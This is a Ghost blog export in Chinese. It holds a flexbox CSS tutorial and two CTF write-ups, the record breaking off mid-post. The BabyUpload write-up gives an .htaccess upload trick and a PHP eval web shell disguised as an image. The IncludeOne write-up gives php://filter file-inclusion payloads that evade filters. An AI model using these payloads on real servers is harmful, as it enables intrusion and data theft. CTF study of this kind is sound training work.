flex-wrap\"],[1,[],0,0],[0,[],0,\"\\t\"],[1,[],0,1],[0,[],0,\"例：flex-flow: row wrap;\"]]],[1,\"h3\",[[0,[],0,\"子项常见属性\"]]],[3,\"ul\",[[[0,[0],1,\"flex子项目占的份数\"]]]],[1,\"blockquote\",[[0,[],0,\"flex 属性定义子项目分配剩余空间，用flex来表示占多少份数。\"]]],[3,\"ul\",[[[0,[0],1,\"align-self控制子项自己在侧轴的排列方式\"]]]],[1,\"blockquote\",[[0,[],0,\"align-self 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖 align-items 属性。\"],[1,[],0,2],[0,[],0,\"默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。\"]]],[3,\"ul\",[[[0,[0],1,\"order属性定义子项的排列顺序（前后顺序）\"]]]],[1,\"blockquote\",[[0,[],0,\"数值越小，排列越靠前，默认为0。\"]]],[1,\"p\",[[1,[],0,3]]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<hr><h2 id=\"flex%E5%B8%83%E5%B1%80\">flex布局</h2><ul><li>操作方便，布局及其简单，移动端应用比较广泛</li><li>IE11或者更低版本不支持flex或者仅支持部分</li></ul><h2 id=\"flex%E5%B8%83%E5%B1%80%E5%8E%9F%E7%90%86\">flex布局原理</h2><ul><li>flex 是 flexible Box 的缩写，意为\"弹性布局\"，用来为盒状模型提供最大的灵活性，任何一个容器都可以指定为 flex 布局。</li><li>当我们为父盒子设为 flex 布局以后，子元素的 float、clear 和 vertical-align 属性将失效。</li><li>flex布局又叫伸缩布局 、弹性布局 、伸缩盒布局 、弹性盒布局</li><li>采用 Flex 布局的元素，称为 Flex 容器（flexcontainer），简称\"容器\"。</li><li>它的所有子元素自动成为容器成员，称为 Flex 项目（flexitem），简称\"项目\"。</li></ul><p><strong>总结</strong>：就是通过给父盒子添加flex属性，来控制子盒子的位置和排列方式</p><h2 id=\"%E7%88%B6%E9%A1%B9%E5%B8%B8%E8%A7%81%E5%B1%9E%E6%80%A7\">父项常见属性</h2><ul><li><strong>flex-direction：    设置主轴的方向</strong></li><li><strong>justify-content：     设置主轴上的子元素排列方式</strong></li><li><strong>flex-wrap：      设置子元素是否换行</strong></li><li><strong>align-content：    设置侧轴上的子元素的排列方式（多行）</strong></li><li><strong>align-items：     设置侧轴上的子元素排列方式（单行）</strong></li><li><strong>flex-flow：       复合属性，相当于同时设置了 flex-direction 和 flex-wrap</strong></li></ul><h3 id=\"flex-direction\">flex-direction</h3><ul><li><strong>设置主轴放向</strong></li><li>row       默认值从左到右</li><li>row-reverse        从右到左</li><li>column            从上到下</li><li>column-reverse      从下到上</li></ul><h3 id=\"justify-content\">justify-content</h3><ul><li><strong>设置主轴上子元素排列方式</strong></li><li>flex-start          默认值从头部开始</li><li>flex-end           从尾部开始排列</li><li>center            在主轴居中对齐</li><li>space-around       平分剩余空间</li><li>space-between    先俩边贴边在平分剩余空间</li></ul><h3 id=\"flex-wrap\">flex-wrap</h3><ul><li><strong>设置是否换行</strong></li><li>nowrap      默认不换行</li><li>wrap       换行</li></ul><h3 id=\"align-items\">align-items</h3><ul><li><strong>设置侧轴上的子元素排列方式（单行情况）</strong></li><li>flex-start     从头部开始</li><li>flex-end      从尾部开始</li><li>center       居中显示</li><li>stretch        拉伸</li></ul><h3 id=\"align-content\">align-content</h3><ul><li><strong>设置侧轴上的子元素排序（多行情况）</strong></li><li>flex-start          默认在侧轴的头部开始排列</li><li>flex-end           在侧轴的尾部开始排列</li><li>center            在侧轴中间显示</li><li>space-around       子项在侧轴平分剩余空间</li><li>space-between    子项在侧轴先分布在两头，在平分剩余空间</li><li>stretch           设置子项元素高度平分父元素高度</li></ul><h3 id=\"align-content-%E5%92%8Calign-items%E5%8C%BA%E5%88%AB\">align-content 和align-items区别</h3><ul><li>align-items  适用于单行情况下， 只有上对齐、下对齐、居中和 拉伸</li><li>align-content适应于换行（多行）的情况下（单行情况下无效）， 可以设置 上对齐、下对齐、居中、拉伸以及平均分配剩余空间等属性值。</li><li>总结就是单行找align-items  多行找 align-content</li></ul><h3 id=\"%E5%A4%8D%E5%90%88%E5%B1%9E%E6%80%A7\">复合属性</h3><blockquote>flex-flow  ==  flex-direction + flex-wrap<br> <br>例：flex-flow: row wrap;</blockquote><h3 id=\"%E5%AD%90%E9%A1%B9%E5%B8%B8%E8%A7%81%E5%B1%9E%E6%80%A7\">子项常见属性</h3><ul><li><strong>flex子项目占的份数</strong></li></ul><blockquote>flex 属性定义子项目分配剩余空间，用flex来表示占多少份数。</blockquote><ul><li><strong>align-self控制子项自己在侧轴的排列方式</strong></li></ul><blockquote>align-self 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖 align-items 属性。<br>默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。</blockquote><ul><li><strong>order属性定义子项的排列顺序（前后顺序）</strong></li></ul><blockquote>数值越小，排列越靠前，默认为0。</blockquote>",
                        "comment_id": "637217cc3d88f46264b10f65",
                        "plaintext": "flex布局\n\n * 操作方便，布局及其简单，移动端应用比较广泛\n * IE11或者更低版本不支持flex或者仅支持部分\n\n\nflex布局原理\n\n * flex 是 flexible Box 的缩写，意为\"弹性布局\"，用来为盒状模型提供最大的灵活性，任何一个容器都可以指定为 flex 布局。\n * 当我们为父盒子设为 flex 布局以后，子元素的 float、clear 和 vertical-align 属性将失效。\n * flex布局又叫伸缩布局 、弹性布局 、伸缩盒布局 、弹性盒布局\n * 采用 Flex 布局的元素，称为 Flex 容器（flexcontainer），简称\"容器\"。\n * 它的所有子元素自动成为容器成员，称为 Flex 项目（flexitem），简称\"项目\"。\n\n总结：就是通过给父盒子添加flex属性，来控制子盒子的位置和排列方式\n\n\n父项常见属性\n\n * flex-direction：    设置主轴的方向\n * justify-content：     设置主轴上的子元素排列方式\n * flex-wrap：      设置子元素是否换行\n * align-content：    设置侧轴上的子元素的排列方式（多行）\n * align-items：     设置侧轴上的子元素排列方式（单行）\n * flex-flow：       复合属性，相当于同时设置了 flex-direction 和 flex-wrap\n\n\nflex-direction\n\n * 设置主轴放向\n * row       默认值从左到右\n * row-reverse        从右到左\n * column            从上到下\n * column-reverse      从下到上\n\n\njustify-content\n\n * 设置主轴上子元素排列方式\n * flex-start          默认值从头部开始\n * flex-end           从尾部开始排列\n * center            在主轴居中对齐\n * space-around       平分剩余空间\n * space-between    先俩边贴边在平分剩余空间\n\n\nflex-wrap\n\n * 设置是否换行\n * nowrap      默认不换行\n * wrap       换行\n\n\nalign-items\n\n * 设置侧轴上的子元素排列方式（单行情况）\n * flex-start     从头部开始\n * flex-end      从尾部开始\n * center       居中显示\n * stretch        拉伸\n\n\nalign-content\n\n * 设置侧轴上的子元素排序（多行情况）\n * flex-start          默认在侧轴的头部开始排列\n * flex-end           在侧轴的尾部开始排列\n * center            在侧轴中间显示\n * space-around       子项在侧轴平分剩余空间\n * space-between    子项在侧轴先分布在两头，在平分剩余空间\n * stretch           设置子项元素高度平分父元素高度\n\n\nalign-content 和align-items区别\n\n * align-items  适用于单行情况下， 只有上对齐、下对齐、居中和 拉伸\n * align-content适应于换行（多行）的情况下（单行情况下无效）， 可以设置 上对齐、下对齐、居中、拉伸以及平均分配剩余空间等属性值。\n * 总结就是单行找align-items  多行找 align-content\n\n\n复合属性\n\nflex-flow  ==  flex-direction + flex-wrap\n \n例：flex-flow: row wrap;\n\n\n子项常见属性\n\n * flex子项目占的份数\n\nflex 属性定义子项目分配剩余空间，用flex来表示占多少份数。\n\n * align-self控制子项自己在侧轴的排列方式\n\nalign-self 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖 align-items 属性。\n默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。\n\n * order属性定义子项的排列顺序（前后顺序）\n\n数值越小，排列越靠前，默认为0。",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/20e585dab6e23e24808389cf0e01e2c5.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-14T10:26:20.000Z",
                        "updated_at": "2022-11-14T10:55:27.000Z",
                        "published_at": "2022-11-14T10:55:27.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "6372fc953d88f46264b11012",
                        "uuid": "c1977e41-bdbe-4d59-a95c-ea0592540559",
                        "title": "[GXYCTF2019]BabyUpload 1",
                        "slug": "ce-shi",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/7992a746c08441d88c5b62905ad1b3ee.png' />\"}],[\"html\",{\"html\":\"<img src=\\\"https://peekab.oss-cn-hangzhou.aliyuncs.com/image/0f3af6b7dcc343f494f1aadb1a76abce.png\\\" />\"}],[\"code\",{\"code\":\".htaccess文件为：\\n<FilesMatch \\\"xin.png\\\">\\nSetHandler application/x-httpd-php\\n</FilesMatch>\\n\",\"language\":\"c\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/8b76dc6f00644655996434d7590904f0.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/a0400422143440a69168a6a8cdb8193a.png' />\"}],[\"code\",{\"code\":\"图片内容为：\\nGIF89a\\n<script language='php'>eval($_POST['cmd']);</script>\\n\",\"language\":\"c\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/71a92993519a44b7ac5fc66014b45961.png' />\\n\\n<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/3053364881094a08833f6ee6fcfd4cab.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/972691d96b7b41e78b7a49a10898370d.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/329892ff99e74c778c4cb2221c1afdf2.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/c43ad4684b36479eaa69bea5a928bb9c.png' />\\n\\n<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/de3a219b7c9a4a61aeb22f70f4e1434a.png' />\"}]],\"markups\":[],\"sections\":[[1,\"h3\",[[0,[],0,\"1、看页面情况推测是文件上传类型漏洞\"]]],[10,0],[1,\"h3\",[[0,[],0,\"2、然后上传jpg、png、gif发现都上传不上去\"]]],[10,1],[1,\"h3\",[[0,[],0,\"3、然后尝试上传个.htaccess文件，更改content-type为image/jpeg\"]]],[10,2],[10,3],[1,\"p\",[[0,[],0,\"然后上传成功\"]]],[10,4],[1,\"h3\",[[0,[],0,\"4、然后上传一个xin.png木马图片，顺便修改一下content-type为image/jpeg\"]]],[10,5],[1,\"p\",[[0,[],0,\"使用burp\"]]],[10,6],[1,\"h3\",[[0,[],0,\"5、访问一下这个图片路径\"]]],[10,7],[1,\"p\",[]],[1,\"h3\",[[0,[],0,\"6、触发后门，使用蚁剑连接一下，密码为cmd\"]]],[10,8],[1,\"h3\",[[0,[],0,\"7、然后右键文件管理，回到根目录拉到最下面成功找到flag\"]]],[10,9],[1,\"p\",[[0,[],0,\"获得flag，下班！\"]]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h3 id=\"1%E3%80%81%E7%9C%8B%E9%A1%B5%E9%9D%A2%E6%83%85%E5%86%B5%E6%8E%A8%E6%B5%8B%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E\">1、看页面情况推测是文件上传类型漏洞</h3><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/7992a746c08441d88c5b62905ad1b3ee.png' /><!--kg-card-end: html--><h3 id=\"2%E3%80%81%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0jpg%E3%80%81png%E3%80%81gif%E5%8F%91%E7%8E%B0%E9%83%BD%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%B8%8A%E5%8E%BB\">2、然后上传jpg、png、gif发现都上传不上去</h3><!--kg-card-begin: html--><img src=\"https://peekab.oss-cn-hangzhou.aliyuncs.com/image/0f3af6b7dcc343f494f1aadb1a76abce.png\" /><!--kg-card-end: html--><h3 id=\"3%E3%80%81%E7%84%B6%E5%90%8E%E5%B0%9D%E8%AF%95%E4%B8%8A%E4%BC%A0%E4%B8%AAhtaccess%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9B%B4%E6%94%B9content-type%E4%B8%BAimagejpeg\">3、然后尝试上传个.htaccess文件，更改content-type为image/jpeg</h3><pre><code class=\"language-c\">.htaccess文件为：\n&lt;FilesMatch \"xin.png\"&gt;\nSetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/8b76dc6f00644655996434d7590904f0.png' /><!--kg-card-end: html--><p>然后上传成功</p><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/a0400422143440a69168a6a8cdb8193a.png' /><!--kg-card-end: html--><h3 id=\"4%E3%80%81%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AAxinpng%E6%9C%A8%E9%A9%AC%E5%9B%BE%E7%89%87%EF%BC%8C%E9%A1%BA%E4%BE%BF%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%8Bcontent-type%E4%B8%BAimagejpeg\">4、然后上传一个xin.png木马图片，顺便修改一下content-type为image/jpeg</h3><pre><code class=\"language-c\">图片内容为：\nGIF89a\n&lt;script language='php'&gt;eval($_POST['cmd']);&lt;/script&gt;\n</code></pre><p>使用burp</p><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/71a92993519a44b7ac5fc66014b45961.png' />\n\n<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/3053364881094a08833f6ee6fcfd4cab.png' /><!--kg-card-end: html--><h3 id=\"5%E3%80%81%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AA%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84\">5、访问一下这个图片路径</h3><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/972691d96b7b41e78b7a49a10898370d.png' /><!--kg-card-end: html--><p></p><h3 id=\"6%E3%80%81%E8%A7%A6%E5%8F%91%E5%90%8E%E9%97%A8%EF%BC%8C%E4%BD%BF%E7%94%A8%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAcmd\">6、触发后门，使用蚁剑连接一下，密码为cmd</h3><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/329892ff99e74c778c4cb2221c1afdf2.png' /><!--kg-card-end: html--><h3 id=\"7%E3%80%81%E7%84%B6%E5%90%8E%E5%8F%B3%E9%94%AE%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%EF%BC%8C%E5%9B%9E%E5%88%B0%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%8B%89%E5%88%B0%E6%9C%80%E4%B8%8B%E9%9D%A2%E6%88%90%E5%8A%9F%E6%89%BE%E5%88%B0flag\">7、然后右键文件管理，回到根目录拉到最下面成功找到flag</h3><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/c43ad4684b36479eaa69bea5a928bb9c.png' />\n\n<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/de3a219b7c9a4a61aeb22f70f4e1434a.png' /><!--kg-card-end: html--><p>获得flag，下班！</p>",
                        "comment_id": "6372fc953d88f46264b11012",
                        "plaintext": "1、看页面情况推测是文件上传类型漏洞\n\n\n2、然后上传jpg、png、gif发现都上传不上去\n\n\n3、然后尝试上传个.htaccess文件，更改content-type为image/jpeg\n\n.htaccess文件为：\n<FilesMatch \"xin.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n\n\n然后上传成功\n\n\n4、然后上传一个xin.png木马图片，顺便修改一下content-type为image/jpeg\n\n图片内容为：\nGIF89a\n<script language='php'>eval($_POST['cmd']);</script>\n\n\n使用burp\n\n\n\n\n5、访问一下这个图片路径\n\n\n\n\n6、触发后门，使用蚁剑连接一下，密码为cmd\n\n\n7、然后右键文件管理，回到根目录拉到最下面成功找到flag\n\n\n\n获得flag，下班！",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/7669e24c7a09e16378f9155219b64989.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-15T02:42:29.000Z",
                        "updated_at": "2022-11-15T03:32:51.000Z",
                        "published_at": "2022-11-15T03:30:00.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "63739935f7e27b274c0bd8d4",
                        "uuid": "8bf09b46-41d1-416a-8e6c-7573442e6ffe",
                        "title": "Week2 IncludeOne 200",
                        "slug": "includeone-200",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}]],\"cards\":[[\"code\",{\"code\":\"<?php\\nhighlight_file(__FILE__);\\nerror_reporting(0);\\ninclude(\\\"seed.php\\\");\\n//mt_srand(*********);\\necho \\\"Hint: \\\".mt_rand().\\\"<br>\\\";\\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){\\n    if(!preg_match(\\\"/base|\\\\.\\\\./i\\\",$_GET['file']) && preg_match(\\\"/NewStar/i\\\",$_GET['file']) && isset($_GET['file'])){\\n        //flag in `flag.php`\\n        include($_GET['file']);\\n    }else{\\n        echo \\\"Baby Hacker?\\\";\\n    }\\n}else{\\n    echo \\\"No Hacker!\\\";\\n} Hint: 1219893521\\nNo Hacker!\",\"language\":\"php\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115221734.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115222641.png' />\"}],[\"code\",{\"code\":\"<?php\\nhighlight_file(__FILE__);\\nerror_reporting(0);\\ninclude(\\\"seed.php\\\");\\n//mt_srand(*********);\\n\\n// 输出第一个随机数\\necho \\\"Hint: \\\".mt_rand().\\\"<br>\\\";\\n\\n// post请求传入一个guess参数，不能为空并且md5加密要等于下一个随机数\\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){\\n\\n\\t// 参数值中不能有base，必须有NewStar\\n    if(!preg_match(\\\"/base|\\\\.\\\\./i\\\",$_GET['file']) && preg_match(\\\"/NewStar/i\\\",$_GET['file']) && isset($_GET['file'])){\\n    \\n        //flag in `flag.php`\\n        include($_GET['file']);\\n    }else{\\n        echo \\\"Baby Hacker?\\\";\\n    }\\n}else{\\n    echo \\\"No Hacker!\\\";\\n} Hint: 1219893521\\nNo Hacker!\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/hfdhsdhh.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115230438.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115231515.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115231706.png' />\"}],[\"code\",{\"code\":\"file=php://filter/NewStar/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\",\"language\":\"\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116155851.png' />\"}],[\"code\",{\"code\":\"php://filter/NewStar/read=convert.iconv.UCS-4LE.UCS-4BE/resource=flag.php\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116161059.png' />\"}],[\"code\",{\"code\":\"file=php://filter/NewStar/read=convert.iconv.ASCII.UCS-2BE/resource=flag.php\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116160008.png' />\"}],[\"code\",{\"code\":\"file=php://filter/NewStar/convert.iconv.utf-8.utf-7/resource=flag.php\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116160056.png' />\"}]],\"markups\":[],\"sections\":[[1,\"h4\",[[0,[],0,\"0、使用到的知识点\"]]],[1,\"p\",[]],[1,\"blockquote\",[[0,[],0,\"php中mt_srand()、mt_rand() 方法设置随机数种子和生产随机数\"]]],[1,\"blockquote\",[[0,[],0,\"php_mt_seed 工具爆破随机数种子\"]]],[1,\"blockquote\",[[0,[],0,\"php://filter 伪协议读取文件\"]]],[1,\"blockquote\",[[0,[],0,\"php://filter 伪协议rot13编码、url双层编码绕过读取文件\"]]],[1,\"h4\",[[0,[],0,\"1、页面代码\"]]],[10,0],[1,\"h4\",[[0,[],0,\"2、首先根据hint的提示爆破一下随机数种子\"]]],[1,\"blockquote\",[[0,[],0,\"使用php_mt_seed工具，linux中进入php_mt_seed工具所在目录执行以下命令，获得种子为：1145146\"]]],[10,1],[1,\"h4\",[[0,[],0,\"3、使用php的函数获得下一个随机数\"]]],[1,\"blockquote\",[[0,[],0,\"mt_srand(1145146)：设置随机数种子\"],[1,[],0,0],[0,[],0,\"mt_rand()：获得第一个随机数，需要的是第二个随机数\"]]],[10,2],[1,\"blockquote\",[[0,[],0,\"由上面的结果可以看出，第一个随机数就是题目所给提示的数字，然后第二个随机数就是我们所需要的数字\"]]],[1,\"h4\",[[0,[],0,\"4、分析一下代码\"]]],[10,3],[1,\"blockquote\",[[0,[],0,\"看到include可以联想到使用伪协议，然后需要的是读取文件，可以使用：filter协议读取，因为过滤base所以不能使用base64编码读取文件，可以使用rot13编码读取，\"]]],[1,\"blockquote\",[[0,[],0,\"那么file的参数值为：file=php://filter/read=string.rot13/newstar/resource=flag.php\"],[1,[],0,1],[0,[],0,\"因为必须包含NewStar，所以最终结果为：\"],[1,[],0,2],[0,[],0,\"file=php://filter/NewStar/read=string.rot13/newstar/resource=flag.php\"]]],[10,4],[1,\"blockquote\",[[0,[],0,\"查看源代码可以发现一行以rot13编码的flag，将其解码就可有得到flag\"]]],[1,\"h4\",[[0,[],0,\"5、获得flag\"]]],[10,5],[1,\"h4\",[[0,[],0,\"6、强行使用base64读取文件\"]]],[1,\"blockquote\",[[0,[],0,\"因为正则过滤了base这四个字母，但是filter协议自带一层url解码，所以双层url编码可以绕这里的过滤\"],[1,[],0,3],[0,[],0,\" 例如：s的url编码为%73，然后在单独对：%、7、3进行一次url编码得到%25%37%33，从而绕过正则过滤\"]]],[10,6],[1,\"blockquote\",[[0,[],0,\"这样就得到了一串以base64加密的flag，然后网上使用base64解码一下\"]]],[10,7],[1,\"h4\",[[0,[],0,\"7、iconv编码方式绕过\"]]],[1,\"p\",[[0,[],0,\"UCS-2：对目标字符串进行2位一反转\"],[1,[],0,4],[0,[],0,\"UCS-4：对目标字符串进行4位一反转\"]]],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[1,\"p\",[]],[1,\"blockquote\",[[0,[],0,\"最后下班！\"]]],[1,\"p\",[]],[1,\"p\",[]],[1,\"p\",[]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h4 id=\"0%E3%80%81%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9\">0、使用到的知识点</h4><p></p><blockquote>php中mt_srand()、mt_rand() 方法设置随机数种子和生产随机数</blockquote><blockquote>php_mt_seed 工具爆破随机数种子</blockquote><blockquote>php://filter 伪协议读取文件</blockquote><blockquote>php://filter 伪协议rot13编码、url双层编码绕过读取文件</blockquote><h4 id=\"1%E3%80%81%E9%A1%B5%E9%9D%A2%E4%BB%A3%E7%A0%81\">1、页面代码</h4><pre><code class=\"language-php\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);\necho \"Hint: \".mt_rand().\"&lt;br&gt;\";\nif(isset($_POST['guess']) &amp;&amp; md5($_POST['guess']) === md5(mt_rand())){\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) &amp;&amp; preg_match(\"/NewStar/i\",$_GET['file']) &amp;&amp; isset($_GET['file'])){\n        //flag in `flag.php`\n        include($_GET['file']);\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!</code></pre><h4 id=\"2%E3%80%81%E9%A6%96%E5%85%88%E6%A0%B9%E6%8D%AEhint%E7%9A%84%E6%8F%90%E7%A4%BA%E7%88%86%E7%A0%B4%E4%B8%80%E4%B8%8B%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%A7%8D%E5%AD%90\">2、首先根据hint的提示爆破一下随机数种子</h4><blockquote>使用php_mt_seed工具，linux中进入php_mt_seed工具所在目录执行以下命令，获得种子为：1145146</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115221734.png' /><!--kg-card-end: html--><h4 id=\"3%E3%80%81%E4%BD%BF%E7%94%A8php%E7%9A%84%E5%87%BD%E6%95%B0%E8%8E%B7%E5%BE%97%E4%B8%8B%E4%B8%80%E4%B8%AA%E9%9A%8F%E6%9C%BA%E6%95%B0\">3、使用php的函数获得下一个随机数</h4><blockquote>mt_srand(1145146)：设置随机数种子<br>mt_rand()：获得第一个随机数，需要的是第二个随机数</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115222641.png' /><!--kg-card-end: html--><blockquote>由上面的结果可以看出，第一个随机数就是题目所给提示的数字，然后第二个随机数就是我们所需要的数字</blockquote><h4 id=\"4%E3%80%81%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B%E4%BB%A3%E7%A0%81\">4、分析一下代码</h4><pre><code>&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);\n\n// 输出第一个随机数\necho \"Hint: \".mt_rand().\"&lt;br&gt;\";\n\n// post请求传入一个guess参数，不能为空并且md5加密要等于下一个随机数\nif(isset($_POST['guess']) &amp;&amp; md5($_POST['guess']) === md5(mt_rand())){\n\n\t// 参数值中不能有base，必须有NewStar\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) &amp;&amp; preg_match(\"/NewStar/i\",$_GET['file']) &amp;&amp; isset($_GET['file'])){\n    \n        //flag in `flag.php`\n        include($_GET['file']);\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!</code></pre><blockquote>看到include可以联想到使用伪协议，然后需要的是读取文件，可以使用：filter协议读取，因为过滤base所以不能使用base64编码读取文件，可以使用rot13编码读取，</blockquote><blockquote>那么file的参数值为：file=php://filter/read=string.rot13/newstar/resource=flag.php<br>因为必须包含NewStar，所以最终结果为：<br>file=php://filter/NewStar/read=string.rot13/newstar/resource=flag.php</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/hfdhsdhh.png' /><!--kg-card-end: html--><blockquote>查看源代码可以发现一行以rot13编码的flag，将其解码就可有得到flag</blockquote><h4 id=\"5%E3%80%81%E8%8E%B7%E5%BE%97flag\">5、获得flag</h4><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115230438.png' /><!--kg-card-end: html--><h4 id=\"6%E3%80%81%E5%BC%BA%E8%A1%8C%E4%BD%BF%E7%94%A8base64%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6\">6、强行使用base64读取文件</h4><blockquote>因为正则过滤了base这四个字母，但是filter协议自带一层url解码，所以双层url编码可以绕这里的过滤<br> 例如：s的url编码为%73，然后在单独对：%、7、3进行一次url编码得到%25%37%33，从而绕过正则过滤</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115231515.png' /><!--kg-card-end: html--><blockquote>这样就得到了一串以base64加密的flag，然后网上使用base64解码一下</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115231706.png' /><!--kg-card-end: html--><h4 id=\"7%E3%80%81iconv%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87\">7、iconv编码方式绕过</h4><p>UCS-2：对目标字符串进行2位一反转<br>UCS-4：对目标字符串进行4位一反转</p><pre><code>file=php://filter/NewStar/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116155851.png' /><!--kg-card-end: html--><pre><code>php://filter/NewStar/read=convert.iconv.UCS-4LE.UCS-4BE/resource=flag.php</code></pre><!--kg-card-begin: html--><img 